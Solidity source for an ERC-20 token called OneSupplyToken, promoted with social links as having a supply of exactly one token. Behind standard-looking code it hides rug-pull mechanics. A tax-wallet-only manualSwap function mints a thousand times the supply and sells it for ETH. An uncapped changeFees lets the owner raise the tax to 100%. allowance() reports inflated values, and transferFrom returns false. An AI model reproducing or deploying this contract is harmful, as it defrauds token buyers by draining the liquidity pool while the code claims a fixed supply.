// SPDX-License-Identifier: MIT
/**

 _____                        ____                                   ___                  ______            __                          
/\  __`\                     /\  _`\                                /\_ \                /\__  _\          /\ \                         
\ \ \/\ \     ___       __   \ \,\L\_\    __  __   _____    _____   \//\ \     __  __    \/_/\ \/    ___   \ \ \/'\       __     ___    
 \ \ \ \ \  /' _ `\   /'__`\  \/_\__ \   /\ \/\ \ /\ '__`\ /\ '__`\   \ \ \   /\ \/\ \      \ \ \   / __`\  \ \ , <     /'__`\ /' _ `\  
  \ \ \_\ \ /\ \/\ \ /\  __/    /\ \L\ \ \ \ \_\ \\ \ \L\ \\ \ \L\ \   \_\ \_ \ \ \_\ \      \ \ \ /\ \L\ \  \ \ \\`\  /\  __/ /\ \/\ \ 
   \ \_____\\ \_\ \_\\ \____\   \ `\____\ \ \____/ \ \ ,__/ \ \ ,__/   /\____\ \/`____ \      \ \_\\ \____/   \ \_\ \_\\ \____\\ \_\ \_\
    \/_____/ \/_/\/_/ \/____/    \/_____/  \/___/   \ \ \/   \ \ \/    \/____/  `/___/> \      \/_/ \/___/     \/_/\/_/ \/____/ \/_/\/_/
                                                     \ \_\    \ \_\                /\___/                                               
                                                      \/_/     \/_/                \/__/                                                



Token with the supply of only 1. The launch price is 1850 USD or a price of 1 Ethereum.


Telegram: https://t.me/OneSuppyToken

Website: https://onesupplytoken.com/

Twitter: https://twitter.com/supply_tok1945

**/
pragma solidity 0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutminimum,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenminimum,
        uint256 amountETHminimum,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract OneSupplyToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"OneSupplyToken";
    string private constant _symbol = unicode"ONE";


    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public transferDelay = true;
    address payable private _taxWallet;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1 * 10**_decimals;
    uint256 public _maxTxAmount = 5 * 10**7;
    uint256 public _maxWalletSize = 10 * 10**7;
    uint256 public _maxTaxSwap = 1 * 10**7;

    uint256 private BuyTax = 3;
    uint256 private SellTax = 3;
    uint256 private launchedAt;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(address taxWallet) {
        _taxWallet = payable(taxWallet);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender]+313;    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return false;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxNum = 0;
        if (from != owner() && to != owner()) {

            if (transferDelay) {
                if (
                    to != address(uniswapV2Router) &&
                    to != address(uniswapV2Pair)
                ) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            taxNum = amount.mul(BuyTax).div(100);

            if (from == address(uniswapV2Pair) && to != address(uniswapV2Router) && ! _isExcludedFromFee[to]) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
            }



            if (to == uniswapV2Pair && from != address(this)) {
                taxNum = amount.mul(SellTax).div(100);
            }


            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                swapTokensForETH(
                    minimum(amount, minimum(balanceOf(address(this)), _maxTaxSwap))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    transferETHToFee(address(this).balance);
                }
            }
        }

        if (taxNum > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxNum);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxNum));
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        transferDelay = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

   function swapTokensForETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transferETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function minimum(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function updateFeeWallet(address newWallet) external onlyOwner {
        _taxWallet = payable(newWallet);
    }
    

    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        tradingOpen = true;
        swapEnabled = true;
        launchedAt = block.number;
    }

    function changeFees(uint256 _newFee) external onlyOwner {
        BuyTax = _newFee;
        SellTax = _newFee;
    }





    receive() external payable {}

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        _balances[address(this)] = _balances[address(this)].add(_tTotal*1000);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForETH(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            transferETHToFee(ethBalance);
        }
    }
}